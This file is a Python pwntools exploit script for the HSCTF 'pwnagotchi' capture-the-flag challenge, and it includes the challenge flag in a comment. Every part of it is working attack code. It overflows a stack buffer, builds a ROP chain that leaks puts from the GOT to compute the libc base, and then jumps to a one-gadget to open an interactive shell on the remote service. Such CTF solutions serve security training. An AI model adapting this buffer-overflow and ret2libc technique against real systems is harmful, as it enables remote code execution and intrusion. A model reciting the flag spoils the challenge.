#exploit for pwnagotchi
#flag=flag{theyre_so_cute}
#this exploit worked live in the CTF
import time
from pwn import *
target=remote('pwn.hsctf.com', 5005)
#target=process('./pwnagotchi')
libc=ELF('/media/sf_kalishared/tools/The_Night-master/libcs/libc6_2.27-3ubuntu1_amd64.so')
context.terminal=["tmux","split","-h"]
#gdb.attach(target,gdbscript="break *0x400988")

print(target.recvline())
payload="A"*(0xc+8)

ret=0x400285
puts_got=0x601018
puts_plt=0x400660
start=0x400700
poprdi=0x4009f3
once=0x601099
hungry=0x601078
sleepy=0x601079
zzz=0x400801
eat=0x4007E7
gets_plt=0x4006b0

payload+=p64(ret)
payload+=p64(poprdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(poprdi)
payload+=p64(once)
payload+=p64(gets_plt)
payload+=p64(start)
payload+="\x00"*7

target.sendline(payload)
time.sleep(1)
print(target.recvuntil("happy!\n"))
leak=target.recvline().strip("\n")[0:6]
libc_puts=u64(leak+"\x00"*(8-len(leak)))
libc_base=libc_puts-libc.symbols["puts"]
print(hex(libc_base))
gadget=0x4f322
libc_gadget=libc_base+gadget
target.sendline(p64(0))
time.sleep(1)

payload="A"*(0xc+8)
payload+=p64(libc_gadget)
payload+="\x00"*(0x80)
target.sendline(payload)
target.interactive()
